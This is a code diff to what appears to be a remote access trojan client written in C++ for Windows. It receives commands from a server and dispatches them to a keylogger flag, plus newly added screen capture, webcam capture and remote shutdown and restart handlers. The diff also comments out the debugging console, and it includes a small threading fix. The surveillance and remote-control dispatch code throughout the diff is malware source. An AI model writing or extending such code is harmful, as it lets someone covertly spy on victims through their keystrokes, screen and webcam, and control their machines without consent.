@@ -15,10 +15,8 @@
 #include "ImGuiScrollableText.hpp"
 #include "Message.hpp"
 #include "InternalUtilities.hpp"
-#include "FunctionalityStruct.hpp"
 #include "Engine.hpp"
 
-#define DEFAULT_BUFLEN 2048
 #define DEFAULT_PORT 62300
 
 sf::SoundBuffer connectedSoundBuffer, disconnectedSoundBuffer;
@@ -35,7 +33,6 @@ int MessageExecute(const Message& inputMessage, Message& outputMessage);
 class ServerConnection : public PeerConnection {
 public:
     std::atomic<bool> connecting{false};
-    FunctionalityStruct funcStruct;
 
     bool connectToServer(const std::string& address = "127.0.0.1", uint16_t port = DEFAULT_PORT) {
         if (connecting.load() || active.load()) return false;
@@ -101,7 +98,7 @@ private:
                 case ReceiveStatus::Success: {
                     Message msg;
                     if (processCompleteMessage(msg)) {
-                        std::thread([&msg, this]() {
+                        std::thread([msg, this]() {
                             Message outMsg;
                             if (MessageExecute(msg, outMsg)) {
                                 miniConsole.AddLineSuccess("Successfully execute message");
@@ -114,6 +111,8 @@ private:
                                 miniConsole.AddLineError("Failed to execute message");
                             }
                         }).detach();
+                    } else {
+                        miniConsole.AddLineError("Failed to process message");
                     }
                     break;
                 }
@@ -161,6 +160,34 @@ int MessageExecute(const Message& inputMessage, Message& outputMessage) {
                 connectionManager.funcStruct.isKeyloggerActive = true;
                 return 0;
             }
+        }
+        case MessageScreenCap: {
+            if(ScreenCapHandler(inputMessage, outputMessage)) {
+                miniConsole.AddLineInfo("Screen captured");
+                return 1;
+            } else {
+                miniConsole.AddLineError("CAn't capture screen");
+                return 0;
+            }
+        }
+        case MessageInvokeWebcam: {
+            connectionManager.funcStruct.isWebcamActive = true;
+            int status = InvokeWebcamHandler(inputMessage, outputMessage);
+            if(status) {
+                miniConsole.AddLineInfo("Webcam captured. Woo!");
+            } else {
+                miniConsole.AddLineError("CAn't capture webcam");
+            }
+            connectionManager.funcStruct.isWebcamActive = false;
+            return status;
+        }
+        case MessageShutdownMachine: {
+            (void) ShutdownEngine(inputMessage, outputMessage);
+            return true;
+        }
+        case MessageRestartMachine: {
+            (void) RestartEngine(inputMessage, outputMessage);
+            return true;
         }
         
         default: break;
@@ -212,7 +239,7 @@ void RunGui() {
 
         ImGui::BeginDisabled();
         ImGui::Checkbox("IsKeylogger", &connectionManager.funcStruct.isKeyloggerActive);
-        ImGui::Checkbox("IsScreenCap", &connectionManager.funcStruct.isScreenCapActive);
+        ImGui::Checkbox("IsWebcam", &connectionManager.funcStruct.isWebcamActive);
         ImGui::EndDisabled();
     }
     ImGui::SeparatorText("Console");
@@ -275,12 +302,18 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, WCHAR *lpCmdLi
     UNREFERENCED_PARAMETER(nCmdShow);
     //Attach console for debugging
     
+    /*
     if (AttachConsole(ATTACH_PARENT_PROCESS) || AllocConsole()) {
         freopen("CONOUT$", "w", stdout);
         freopen("CONOUT$", "w", stderr);
     }
-    
-    
+    */
+
+    ULONG_PTR gdiplusToken;
+    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
+
+    // Initialize GDI+
+    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
     
     // Initialize Winsock
     WSADATA wsaData;
@@ -298,5 +331,6 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, WCHAR *lpCmdLi
     connectionManager.disconnect();
 
     WSACleanup();
+    Gdiplus::GdiplusShutdown(gdiplusToken);
     return 0;
 }
